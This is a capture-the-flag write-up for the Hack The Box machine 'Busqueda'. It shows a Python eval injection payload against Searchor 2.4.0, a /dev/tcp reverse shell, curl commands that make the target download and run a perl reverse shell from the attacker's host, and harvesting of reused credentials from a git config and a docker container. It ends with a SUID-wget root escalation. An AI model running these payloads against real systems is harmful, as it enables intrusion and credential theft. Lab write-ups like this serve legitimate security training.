# Busqueda - HTB(Easy)
## IP = 10.129.200.37

### NMAP

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

While enumerating the target I came by a python library that is used to search the internet, this lib is called "Searchor" and I saw that the target is using "Searchor 2.4.0". So I started searching for a vulnerability I came across a pull request in the Searchor github saying: "This pull request removes the use of eval in the cli code, achieving the same functionality while removing vulnerability of allowing execution of arbitrary code." - https://github.com/ArjunSharda/Searchor/pull/130 So in version 2.4.2 there was a code execution vulnerability meaning probably because we're running an even lower version so it's effected as well. I could've downloaded the source code of the version we're on but I was lazy and thought to myself, well it's probably because I didn't find anything else. This is the code before the patch:

```

url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)

```

So I had to find a way to exploit, because I didn't have PoCs I needed to do this myself.

I created myself a program that has the same code in it, but those parameters are input:

```

#!/usr/bin/env python3
def search(engine, query, copy, open):
    url = eval(
        f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
    )
search(input(), input(), input(), input())

```

And I started running tests, I was trying to find a way to enter the following payload: `__import__('os').system('whoami')` 

so I did it after a long time of eating poop I finally found the correct payload.

Payload: `aaa'), __import__('os').system('whoami') #`
First I enter some input and close the search function then I enter in a `,` to put in the intended payload after that I comment everything else with `#` because it's python and boom. Now you load it into burp and and enter it as the query parameter.


```

POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://searcher.htb

engine=Google&query=aaa'),+__import__('os').system('whoami')+%23

```

The result: `svc`.

Lets get a reverse shell.

So I tried running the regular `/bin/bash -i >& /dev/tcp/10.10.14.106/9999 0>&1` but it didn't, I tried decoding it from base64 and then running but failed again. So I thought of I to get a shell then I figured out I can download stuff to the shell, So downloaded the pentestmonkey perl reverse shell(https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl) to the target machine and ran it: 

```
(Window 1)$ python3 -m http.server 80

(Window 2)$ curl -s http://searcher.htb/search -d "engine=Google&query=aaa')%2c%20__import__('os').system('wget http://10.10.14.106/perl-reverse-shell.pl -O /dev/shm/perl-reverse-shell.pl')%20%23"

(Window 1)$ nc -lnvp 9998

(Window 2)$ curl -s http://searcher.htb/search -d "engine=Google&query=aaa')%2c%20__import__('os').system('perl /dev/shm/perl-reverse-shell.pl')%20%23"

```
Don't forget to edit the file.

```

(Window 1)$ nc -lnvp 9998
listening on [any] 9998 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.200.37] 35450
 11:50:02 up 16:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux busqueda 5.15.0-69-generic #76-Ubuntu SMP Fri Mar 17 17:19:29 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
uid=1000(svc) gid=1000(svc) groups=1000(svc)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
svc@busqueda:/$ ^Z
zsh: suspended  nc -lnvp 9998
                                                                                      
$ stty raw -echo; fg
[1]  + continued  nc -lnvp 9998

svc@busqueda:/$ export TERM=xterm

```

### Post Exploitation

So we don't have the password of the given `svc` user, after enumerating a little bit you can find the `/var/www/app/.git` directory after there are a couple of files and stuff we can explore I started with the config file because it's always the most interesting.

```

svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ sudo -l 
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```

We find here a couple of things the first, there is a new subdomain that we can explore, the second, we have the credentials to this domain, and the third this same password works for our `svc` user so we can see our sudo permissions.

```
Credentials:
cody:jh1usoih2bkjaspwe92
svc:jh1usoih2bkjaspwe92

```

When entering the gitea server, there is nothing for us we can enter as cody and see the searcher.htb app source code, but we could do that before. There is one interesting thing here thought, and it's the Administrator user, we know he can do stuff that we can't and maybe he even has a private repository that will help us going forward.

### Privilege Escalation 

So we can see we can run the following python script as root: `/opt/scripts/system-checkup.py` 

```

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py sdfdfd
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

So we need to learn a little bit about docker. So lets see the running containers. 

```

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

```

The interesting container here is the mysql database. When reading a little bit here - https://docs.docker.com/engine/reference/commandline/inspect/ I found a format thats great to provide us the information we need for that db.

```

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a | jq

"Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ]

```

great so this is interesting we got usernames, passwords and all that so lets try and connect.

```

svc@busqueda:~$ mysql -h 127.0.0.1 -u root -p
Enter password: jI86kGUuj87guWr3RyF

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

mysql> use gitea;
mysql> show TABLES;
...
| user                      |
...

mysql> DESCRIBE user;
+--------------------------------+---------------+------+-----+---------+----------------+
| Field                          | Type          | Null | Key | Default | Extra          |
...
| name                           | varchar(255)  | NO   | UNI | NULL    |                |
...
| passwd                         | varchar(255)  | NO   |     | NULL    |                |
| passwd_hash_algo               | varchar(255)  | NO   |     | argon2  |                |
| must_change_password           | tinyint(1)    | NO   |     | 0       |                |
| salt                           | varchar(32)   | YES  |     | NULL    |                |
...

mysql> SELECT name, passwd FROM user;
+---------------+------------------------------------------------------------------------------------------------------+
| name          | passwd                                                                                               |
+---------------+------------------------------------------------------------------------------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------------------------------------------------------------------------------------------+

```

But this, this is just a disgusting rabbit hole that I wondered around for way to long. You can try and crack the hash, it's wouldn't lead you anywhere, instead you can look again at those MySQL creds, and remember svc and cody reused the same password, maybe, administrator likes to reuse too. Let's try and login as Administrator with two of those password we got from the docker inspect. And one works! `"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"` password joined with the Administrator user logs us in.


```
Credentials:
Administrator:yuiu1hoiu4i5ho1uh
```

So, know we can see the source inside the /opt/scripts directory, the interesting thing to do here is absolutely the `system-checkup.py` because we can run it with sudo privileges, so I looked I little bit, this statement caught my eye.

```

elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)

```

This is a very insecure way of running command, because it doesn't use the full absolute path of the `full-checkup.sh` script. Because of that we can create our own malicious script called `full-checkup.sh` and escalate our privileges that way.

To that you need to do the following:

```

svc@busqueda:/dev/shm/my_dir$ cat full-checkup.sh
#!/bin/bash

chmod u+s /usr/bin/wget

svc@busqueda:/dev/shm/my_dir$ chmod +x full-checkup.sh                  
svc@busqueda:/dev/shm/my_dir$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/dev/shm/my_dir$ find / -perm -4000 2>/dev/null
...
/usr/bin/wget 
...

svc@busqueda:/dev/shm/my_dir$ TF=$(mktemp)
svc@busqueda:/dev/shm/my_dir$ chmod +x $TF
svc@busqueda:/dev/shm/my_dir$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
svc@busqueda:/dev/shm/my_dir$ /usr/bin/wget --use-askpass=$TF 0
# bash -p
bash-5.1# cat /root/root.txt 
c6e210d4564f7985bf5b011033f6764a

```

And thats all for this box, fun and easy machine with a lot some twists like reused passwords and no public PoC for the foothold so you need to build the payload yourself overall great machine. Thanks for tuning in, Cheers!
